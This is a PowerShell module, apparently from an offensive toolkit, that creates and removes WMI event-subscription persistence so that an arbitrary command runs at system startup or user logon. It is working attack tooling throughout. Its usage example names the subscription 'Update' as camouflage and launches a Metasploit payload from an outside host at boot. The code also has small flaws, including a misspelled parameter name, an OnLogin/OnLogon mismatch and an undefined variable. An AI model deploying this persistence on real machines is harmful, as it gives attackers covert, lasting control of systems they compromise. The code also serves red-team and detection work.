function New-WMIPersistence {
    <#
      .SYNOPSIS 
      Creates persistence through WMI event subscriptions

      Author: Jared Haight (@jaredhaight)
      License: MIT License
      Required Dependencies: None
      Optional Dependencies: None

      .DESCRIPTION 
      This script allows you to specify arbitrary commands to be executed on system startup or on user login

      .PARAMETER Name
      The name to be used for the WMI Filter, Consumer and Binding
      
      .PARAMETER Commmad
      The command to run

      .PARAMETER Arguments
      The arguments to pass to the command when it's run.

      .PARAMETER OnStartup 
      Run the WMI event on Startup
      
      .PARAMETER OnLogin
      Run the WMI event on Login (Can't be used with OnStartup)

      .EXAMPLE 
      PS C:\> New-WMIPersistence -Name Update -OnStartup -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Arguments "-Command Invoke-MetasploitPayload example.com"

      Description
      -----------
      Create a WMI subscription that runs Invoke-MetasploitPayload when the computer starts.

      .LINK 
      Script source can be found at https://github.com/jaredhaight/PowerPunch/blob/master/Persistence/New-WMIPersistence.ps1
    
    #>


    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$Name,

        [Parameter(Mandatory=$True)]
        [string]$Command,

        [string]$Arguments,

        [switch]$OnStartup=$True,

        [switch]$OnLogon=$False
    )

    if ($OnLogon) {
        $query = "Select * from __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' and TargetInstance.LogonType = 2"
    }

    if ($OnStartup) {
        $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
    }

    $filterArgs = @{
        Name=$Name;
        EventNameSpace="root\cimv2";
        QueryLanguage="WQL";
        Query=$query
    }
    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $filterArgs

    $consumerArgs = @{
        Name="$Name";
        ExecutablePath= $Command;
        CommandLineTemplate ="$Command $Arguments"
    }
    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $consumerArgs
    
    $instanceArgs = @{
        Filter=$WMIEventFilter;
        Consumer=$WMIEventConsumer
    }

    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $instanceArgs
}

Function Remove-WMIPersistence {
    <#
      .SYNOPSIS 
      Removes persistence created through New-WMIPersistence

      Author: Jared Haight (@jaredhaight)
      License: MIT License
      Required Dependencies: None
      Optional Dependencies: None

      .DESCRIPTION 
      This script removes the Filter, Consumer and Binding created by New-WMIPersistence

      .PARAMETER Name
      The name to used for when New-WMIPersistence was run

      .EXAMPLE 
      PS C:\> Remove-WMIPersistence -Name Update 

      .LINK 
      Script source can be found at https://github.com/jaredhaight/PowerPunch/blob/master/Persistence/New-WMIPersistence.ps1
    
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$Name
    )
    
    $filter = Get-WmiObject -Namespace "root/subscription" -Class __EventFilter -Filter "Name = '$Name'"

    if ($filter) {
        Write-Verbose "Removing Filter: $Name"
        $filter | Remove-WmiObject
    }
    else {
        Write-Warning "No __EventFilter named $Name found!"
    }

    $consumer = Get-WmiObject -Namespace "root/subscription" -Class CommandLineEventConsumer -Filter "Name = '$Name'"
    
    if ($consumer) {
        Write-Verbose "Removing Consumer: $Name"
        $consumer | Remove-WmiObject
    }
    else {
        Write-Warning "No CommandLineEventConsumer named $ConsumerName found!"
    }

    $filterToConsumerBinding = Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.Filter -match "$Name"}
    if ($filterToConsumerBinding) {
        Write-Verbose "Removing Binding: $Name"
        $filterToConsumerBinding | Remove-WmiObject
    }
    else {
        Write-Warning "No FilterToConsumerBinding named $Name found!"
    }
 }